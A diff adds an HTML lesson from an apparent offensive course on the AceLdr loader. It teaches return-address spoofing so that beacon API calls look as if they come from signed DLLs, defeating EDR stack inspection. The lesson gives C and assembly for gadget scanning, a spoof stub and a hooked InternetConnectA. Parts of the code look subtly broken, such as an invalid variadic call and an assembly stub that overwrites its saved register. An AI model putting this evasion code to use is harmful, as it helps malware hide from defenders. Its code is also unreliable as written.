@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 7: Return Address Spoofing - AceLdr Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🖥️</text></svg>">
+<link rel="stylesheet" href="../../assets/course.css">
+<style>:root{--accent:#00d4ff;--accent2:#7c3aed;--gradient:linear-gradient(135deg,#00d4ff,#7c3aed)}</style>
+</head>
+<body>
+<button class="hamburger" aria-label="Toggle navigation">&#9776;</button>
+<nav>
+  <div class="logo">
+    <h2>AceLdr Course</h2>
+    <span>Memory Evasion Masterclass</span>
+  </div>
+  <a class="home-link" href="../AceLdr_index.html">&larr; Course Home</a>
+  <a class="mod-link" href="module1.html"><span>1. Windows Memory 101</span><span class="diff d1">d1</span></a>
+  <a class="mod-link" href="module2.html"><span>2. PE File Format</span><span class="diff d1">d1</span></a>
+  <a class="mod-link" href="module3.html"><span>3. PEB &amp; API Hashing</span><span class="diff d1">d1</span></a>
+  <a class="mod-link" href="module4.html"><span>4. Reflective Loading</span><span class="diff d2">d2</span></a>
+  <a class="mod-link" href="module5.html"><span>5. Position-Independent Code</span><span class="diff d2">d2</span></a>
+  <a class="mod-link" href="module6.html"><span>6. IAT Hooking</span><span class="diff d2">d2</span></a>
+  <a class="mod-link active" href="module7.html"><span>7. Return Addr Spoofing</span><span class="diff d3">d3</span></a>
+  <a class="mod-link" href="module8.html"><span>8. FOLIAGE Sleep Mask</span><span class="diff d3">d3</span></a>
+  <a class="mod-link" href="module9.html"><span>9. Full Chain &amp; Integration</span><span class="diff d3">d3</span></a>
+</nav>
+
+<main>
+<h1>Module 7: Return Address Spoofing</h1>
+<p class="subtitle">Making your call stacks look like they came from legitimate code</p>
+<span class="diff-badge hard">Advanced</span>
+
+<!-- ===== Section 1: Threat Model ===== -->
+<h2>The Threat Model</h2>
+
+<div class="card highlight">
+<h4>Why Return Addresses Matter</h4>
+<p>Modern EDR products and forensic tools inspect the <strong>call stack</strong> of threads making sensitive API calls. Every <code>CALL</code> instruction pushes a return address onto the stack. When a beacon residing in unbacked (non-file-backed) memory calls <code>HeapAlloc</code> or <code>NtWaitForSingleObject</code>, the return address on the stack points back into suspicious RWX memory that doesn't correspond to any known DLL &mdash; an immediate red flag.</p>
+</div>
+
+<p>Defenders use tools like <strong>Moneta</strong>, <strong>Hunt-Sleeping-Beacons</strong>, and <strong>BeaconEye</strong> to walk thread stacks and flag return addresses that point into:</p>
+<ul>
+  <li>Unbacked private memory (no file mapping)</li>
+  <li>Memory with <code>PAGE_EXECUTE_READWRITE</code> permissions</li>
+  <li>Regions whose size and characteristics match known beacon patterns</li>
+</ul>
+
+<p>AceLdr's return address spoofing replaces the real return address on the stack with one that points into a <strong>legitimate, signed DLL</strong>, making the call stack appear benign.</p>
+
+<!-- ===== Section 2: The JMP [RBX] Gadget ===== -->
+<h2>The JMP [RBX] Gadget</h2>
+
+<p>The foundation of AceLdr's spoofing is a specific two-byte instruction sequence found inside legitimate DLLs:</p>
+
+<pre><code><span class="lang-tag">Assembly</span>
+FF 23    ; JMP QWORD PTR [RBX]</code></pre>
+
+<h3>Why This Specific Gadget?</h3>
+
+<div class="card highlight">
+<h4>The <code>FF 23</code> Byte Sequence</h4>
+<p>AceLdr needs a gadget that:</p>
+<ol>
+  <li><strong>Resides in a legitimate, signed DLL</strong> &mdash; So the spoofed return address passes stack-walk verification</li>
+  <li><strong>Performs an indirect jump through a register</strong> &mdash; So we can control where execution actually goes</li>
+  <li><strong>Uses RBX specifically</strong> &mdash; Because RBX is a callee-saved (non-volatile) register in the x64 calling convention, meaning it survives across function calls</li>
+</ol>
+<p>The bytes <code>FF 23</code> encode <code>JMP QWORD PTR [RBX]</code>. After the target API returns, instead of returning to the beacon's suspicious address, execution goes to the gadget inside a trusted DLL, which then jumps to the address stored in <code>[RBX]</code> &mdash; which we control.</p>
+</div>
+
+<!-- ===== Section 3: FindGadget ===== -->
+<h2>FindGadget &mdash; Locating the Gadget at Runtime</h2>
+
+<p>AceLdr cannot hardcode the gadget's address because DLLs are loaded at different base addresses due to ASLR. Instead, it scans the <code>.text</code> section of a legitimate DLL for the <code>FF 23</code> byte sequence:</p>
+
+<pre><code><span class="lang-tag">C &mdash; util.c</span>
+PVOID FindGadget(PVOID Module) {
+    PIMAGE_DOS_HEADER     Dos = Module;
+    PIMAGE_NT_HEADERS     Nt  = (PVOID)((UINT_PTR)Module + Dos->e_lfanew);
+    PIMAGE_SECTION_HEADER Sec = IMAGE_FIRST_SECTION(Nt);
+
+    // Walk sections to find .text
+    for (UINT16 i = 0; i < Nt->FileHeader.NumberOfSections; i++, Sec++) {
+        // Check for executable section
+        if (!(Sec->Characteristics & IMAGE_SCN_MEM_EXECUTE))
+            continue;
+
+        PBYTE Start = (PBYTE)Module + Sec->VirtualAddress;
+        PBYTE End   = Start + Sec->Misc.VirtualSize;
+
+        // Scan for FF 23 (JMP [RBX])
+        for (PBYTE p = Start; p < End - 1; p++) {
+            if (p[0] == 0xFF && p[1] == 0x23) {
+                return (PVOID)p;
+            }
+        }
+    }
+    return NULL;
+}</code></pre>
+
+<h3>Walkthrough</h3>
+<ol>
+  <li><strong>Parse the PE</strong> of the target DLL (e.g., <code>kernel32.dll</code>)</li>
+  <li><strong>Locate executable sections</strong> by checking <code>IMAGE_SCN_MEM_EXECUTE</code></li>
+  <li><strong>Linear scan</strong> through the section bytes looking for the <code>0xFF, 0x23</code> pair</li>
+  <li><strong>Return the first match</strong> &mdash; this is our gadget address inside a signed, legitimate DLL</li>
+</ol>
+
+<div class="card warn">
+<h4>Why It Must Be in a Legitimate DLL</h4>
+<p>If the gadget were in unbacked memory (like the beacon itself), the spoof would be pointless &mdash; the return address would still point to suspicious memory. The entire point is that tools inspecting the stack see a return address inside <code>kernel32.dll</code> or another signed system DLL, which passes all legitimacy checks.</p>
+</div>
+
+<!-- ===== Section 4: PRM Struct ===== -->
+<h2>The PRM Structure</h2>
+
+<p>AceLdr passes spoofing parameters through a structure called <code>PRM</code> (Parameters for Return address Manipulation):</p>
+
+<pre><code><span class="lang-tag">C &mdash; structs</span>
+typedef struct _PRM {
+    PVOID  Trampoline;   // Address of the JMP [RBX] gadget in a legit DLL
+    PVOID  Function;     // Address of the real API to call (e.g., real HeapAlloc)
+    PVOID  Rbx;          // Value to store in RBX (real return address)
+} PRM, *PPRM;</code></pre>
+
+<table>
+  <thead>
+    <tr><th>Field</th><th>Purpose</th><th>Example Value</th></tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code>Trampoline</code></td>
+      <td>Address of <code>FF 23</code> gadget in a signed DLL</td>
+      <td><code>kernel32.dll+0x1A3F2</code></td>
+    </tr>
+    <tr>
+      <td><code>Function</code></td>
+      <td>Real API function to call</td>
+      <td><code>&amp;HeapAlloc</code></td>
+    </tr>
+    <tr>
+      <td><code>Rbx</code></td>
+      <td>Pointer to the real return address (stored where RBX points)</td>
+      <td>Stack address holding real return</td>
+    </tr>
+  </tbody>
+</table>
+
+<!-- ===== Section 5: SpoofRetAddr ===== -->
+<h2>SpoofRetAddr &mdash; The C Wrapper</h2>
+
+<p>The C-level entry point prepares the <code>PRM</code> struct and calls into assembly:</p>
+
+<pre><code><span class="lang-tag">C &mdash; retaddr.c</span>
+PVOID SpoofRetAddr(PVOID Function, PVOID Arg1, ...) {
+    PRM Param;
+
+    // Set up the trampoline (JMP [RBX] gadget found earlier)
+    Param.Trampoline = STUB.Gadget;
+
+    // The real function to call
+    Param.Function = Function;
+
+    // Spoof will call the assembly stub, which:
+    // 1. Saves real return address
+    // 2. Replaces it with Trampoline (gadget in legit DLL)
+    // 3. Sets RBX to point to saved real return address
+    // 4. Calls the real function
+    // 5. Function returns to gadget -> JMP [RBX] -> returns to us
+    return Spoof(&Param, Arg1, ...);
+}</code></pre>
+
+<!-- ===== Section 6: Spoof.asm ===== -->
+<h2>Spoof Assembly &mdash; The Core Mechanism</h2>
+
+<p>The actual stack manipulation happens in hand-written assembly (<code>spoof.asm</code>):</p>
+
+<pre><code><span class="lang-tag">x86-64 Assembly &mdash; spoof.asm</span>
+; Spoof(PRM* param, args...)
+Spoof PROC
+    ; Step 1: Save the real return address from the stack
+    pop    rax              ; Pop real return address into RAX
+
+    ; Step 2: Save callee-saved registers we'll clobber
+    push   rbx              ; Save original RBX (callee-saved)
+
+    ; Step 3: Load PRM struct fields
+    mov    rbx, [rcx]       ; RBX = PRM.Trampoline (gadget address)
+    mov    rcx, [rcx+8]     ; RCX = PRM.Function   (real API addr)
+
+    ; Step 4: Set up the spoofed return address
+    ;   Push the gadget address as the "return address" for the API
+    ;   When the API does RET, it will return to the gadget (in legit DLL)
+    push   rbx              ; Push Trampoline as fake return address
+
+    ; Step 5: Store the real return info where RBX points
+    ;   RBX now points to our saved data on the stack
+    ;   The gadget does JMP [RBX], which will jump to our real return
+    lea    rbx, [rsp+8]     ; RBX points to saved real RBX on stack
+    mov    [rsp+8], rax     ; Store real return address where RBX points
+
+    ; Step 6: Jump to the real API function
+    jmp    rcx              ; Call the real API (e.g., HeapAlloc)
+                            ; API returns via RET -> pops Trampoline addr
+                            ; Trampoline = JMP [RBX] -> jumps to real return
+Spoof ENDP</code></pre>
+
+<!-- ===== Section 7: 6-Step Diagram ===== -->
+<h2>The 6-Step Spoofing Flow</h2>
+
+<div class="diagram">
+  <h4 style="text-align:center;color:var(--accent);margin-bottom:20px;">Return Address Spoofing Lifecycle</h4>
+
+  <div class="flow">
+    <div class="box hl">Step 1<br><small>Pop real return<br>addr into RAX</small></div>
+    <span class="arrow">&rarr;</span>
+    <div class="box y">Step 2<br><small>Save RBX<br>(callee-saved)</small></div>
+    <span class="arrow">&rarr;</span>
+    <div class="box">Step 3<br><small>Load Trampoline<br>&amp; Function from PRM</small></div>
+  </div>
+
+  <div class="flow" style="margin-top:12px;">
+    <div class="box r">Step 4<br><small>Push Trampoline<br>as fake return</small></div>
+    <span class="arrow">&rarr;</span>
+    <div class="box y">Step 5<br><small>Store real return<br>where RBX points</small></div>
+    <span class="arrow">&rarr;</span>
+    <div class="box g">Step 6<br><small>JMP to real API<br>(stack is spoofed)</small></div>
+  </div>
+</div>
+
+<h3>What Happens When the API Returns</h3>
+
+<div class="diagram">
+  <h4 style="text-align:center;color:var(--accent);margin-bottom:15px;">Return Path</h4>
+  <div class="flow">
+    <div class="box">Real API<br>executes <code>RET</code></div>
+    <span class="arrow">&rarr;</span>
+    <div class="box hl">Pops Trampoline<br>(gadget in kernel32)</div>
+    <span class="arrow">&rarr;</span>
+    <div class="box y">Gadget: <code>JMP [RBX]</code><br>RBX points to saved return</div>
+    <span class="arrow">&rarr;</span>
+    <div class="box g">Lands back in<br>our hook code</div>
+  </div>
+</div>
+
+<p>From the EDR's perspective, when it inspects the call stack during the API call, it sees:</p>
+
+<div class="versus">
+  <div>
+    <h5 style="color:var(--red);">Without Spoofing</h5>
+    <pre><code>HeapAlloc
+ &larr; 0x7FF600001234  (unbacked RWX memory!)
+ &larr; 0x7FF600001100  (more suspicious memory)</code></pre>
+  </div>
+  <div>
+    <h5 style="color:var(--green);">With Spoofing</h5>
+    <pre><code>HeapAlloc
+ &larr; 0x7FFB12341A3F  (kernel32.dll+0x1A3F)
+ &larr; 0x7FFB11110000  (legitimate caller)</code></pre>
+  </div>
+</div>
+
+<!-- ===== Section 8: SPOOF Macro ===== -->
+<h2>The SPOOF Macro in Practice</h2>
+
+<p>For convenience, AceLdr provides a <code>SPOOF</code> macro that wraps the entire spoofing flow. Here's how <code>InternetConnectA_Hook</code> uses it:</p>
+
+<pre><code><span class="lang-tag">C &mdash; hooks/net.c</span>
+HINTERNET WINAPI InternetConnectA_Hook(
+    HINTERNET hInternet,
+    LPCSTR    lpszServerName,
+    INTERNET_PORT nServerPort,
+    LPCSTR    lpszUserName,
+    LPCSTR    lpszPassword,
+    DWORD     dwService,
+    DWORD     dwFlags,
+    DWORD_PTR dwContext
+) {
+    // SPOOF macro: calls SpoofRetAddr with the real InternetConnectA
+    // and forwards all arguments. The return address on the stack
+    // will point to the gadget in a legit DLL, not back to the beacon.
+    return (HINTERNET)SPOOF(
+        STUB.Api.InternetConnectA,  // Real API address
+        hInternet,
+        lpszServerName,
+        nServerPort,
+        lpszUserName,
+        lpszPassword,
+        dwService,
+        dwFlags,
+        dwContext
+    );
+}</code></pre>
+
+<p>The <code>SPOOF</code> macro expands to a call to <code>SpoofRetAddr</code>, which fills the <code>PRM</code> struct and invokes the assembly trampoline. The hook function itself is straightforward &mdash; it simply forwards all arguments through the spoofing mechanism.</p>
+
+<div class="card green">
+<h4>Why Not Spoof Everything?</h4>
+<p>AceLdr only spoofs return addresses on <strong>4 specific APIs</strong> (HeapAlloc, RtlAllocateHeap, InternetConnectA, NtWaitForSingleObject). These are the calls most likely to be inspected by EDR during stack walks. Spoofing every API call would add unnecessary overhead and complexity. The two remaining hooks (Sleep and GetProcessHeap) serve entirely different purposes and don't need return address spoofing.</p>
+</div>
+
+<!-- ===== Quiz ===== -->
+<h2>Knowledge Check</h2>
+
+<div class="quiz" id="quiz7">
+  <h4>Module 7 Quiz</h4>
+
+  <div class="quiz-q" data-correct="2">
+    <p>1. What byte sequence does AceLdr scan for when looking for the JMP [RBX] gadget?</p>
+    <label data-opt="0"><input type="radio" name="q7_1"> <code>E9 00</code> &mdash; a near JMP with zero offset</label>
+    <label data-opt="1"><input type="radio" name="q7_1"> <code>48 FF 23</code> &mdash; a REX-prefixed JMP [RBX]</label>
+    <label data-opt="2"><input type="radio" name="q7_1"> <code>FF 23</code> &mdash; JMP QWORD PTR [RBX]</label>
+    <label data-opt="3"><input type="radio" name="q7_1"> <code>FF E3</code> &mdash; JMP RBX (register direct)</label>
+    <div class="explain">The byte sequence is <code>FF 23</code>, which encodes <code>JMP QWORD PTR [RBX]</code>. This is an indirect jump through the memory address pointed to by RBX. Note that <code>FF E3</code> would be <code>JMP RBX</code> (jumping to the value in RBX itself), which is a different instruction. AceLdr needs the indirect variant because RBX points to a memory location holding the real return address.</div>
+  </div>
+
+  <div class="quiz-q" data-correct="1">
+    <p>2. Why must the JMP [RBX] gadget reside in a legitimate, signed DLL?</p>
+    <label data-opt="0"><input type="radio" name="q7_2"> Because unsigned DLLs cannot contain the <code>FF 23</code> byte sequence</label>
+    <label data-opt="1"><input type="radio" name="q7_2"> Because the gadget address becomes the spoofed return address on the stack, and EDR checks whether return addresses point to legitimate modules</label>
+    <label data-opt="2"><input type="radio" name="q7_2"> Because the gadget needs to be at a fixed address, and only signed DLLs have fixed base addresses</label>
+    <label data-opt="3"><input type="radio" name="q7_2"> Because Windows CFG (Control Flow Guard) only allows jumps to signed code</label>
+    <div class="explain">The whole purpose of return address spoofing is to make the call stack look legitimate. When an EDR walks the stack, it checks whether each return address falls within a known, file-backed module. If the gadget were in unbacked memory, the spoofed address would still be flagged as suspicious, defeating the entire purpose. The gadget must be in a signed DLL (like kernel32.dll) so the return address passes legitimacy checks.</div>
+  </div>
+
+  <button class="quiz-btn" onclick="gradeQuiz('quiz7')">Check Answers</button>
+  <div class="quiz-result"></div>
+</div>
+
+<!-- ===== Navigation ===== -->
+<div class="nav-btns">
+  <a href="module6.html">&larr; Module 6: IAT Hooking</a>
+  <a href="module8.html" class="primary">Module 8: FOLIAGE Sleep Mask &rarr;</a>
+</div>
+</main>
+
+<script src="../../assets/course.js"></script>
+</body>
+</html>
